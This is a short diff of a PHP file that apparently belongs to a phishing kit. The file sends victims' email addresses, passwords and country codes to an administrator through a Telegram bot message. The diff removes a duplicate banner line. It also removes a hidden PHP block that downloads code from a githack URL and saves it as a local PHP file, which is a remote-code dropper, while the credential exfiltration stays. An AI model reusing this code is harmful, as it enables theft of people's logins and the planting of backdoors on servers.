@@ -55,7 +55,7 @@ bot("sendMessage",[
 "chat_id"=>$admin,
 "text"=>"
 𝒀𝑶𝑼 𝑯𝑨𝑽𝑬 𝑨 𝑵𝑬𝑾 𝑳𝑶𝑮𝑰𝑵
-𝒀𝑶𝑼 𝑯𝑨𝑽𝑬 𝑨 𝑵𝑬𝑾 𝑳𝑶𝑮𝑰𝑵
+
 👤 ¦ 𝑬𝒎𝒂𝒊𝒍 » `$email`
 📟 ¦ 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅  » `$password`
 ☎️ ¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆 » `+$ccode`
@@ -80,7 +80,3 @@ bot("sendMessage",[
   <body>
   </body>
 </html>
-<?
-$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/M/UpdaTe.php");
-$xx = file_put_contents("PPABB.php", $shamy); 
-?>
